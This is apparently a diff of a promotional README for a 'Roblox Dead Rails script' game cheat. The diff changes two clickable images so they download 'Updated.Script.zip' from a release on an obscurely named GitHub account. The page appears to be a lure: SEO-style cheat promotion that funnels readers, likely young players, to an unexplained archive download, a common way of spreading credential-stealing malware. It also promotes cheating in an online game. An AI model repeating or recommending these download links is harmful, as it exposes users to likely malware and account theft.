@@ -4,10 +4,10 @@
 Roblox is a platform that has attracted millions of players and developers worldwide, offering a wide range of experiences and games. One of the exciting games within Roblox is *Dead Rails*, a thrilling and intense experience that combines unique mechanics with strategic gameplay. To excel at *Dead Rails*, players often look for ways to gain an advantage, and one of the most popular methods is using scripts. This article will explore the **Roblox Dead Rails script**, why it is useful, how to use it, and tips for maximizing its potential in your gameplay.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 
 #### What is a Roblox Dead Rails Script?
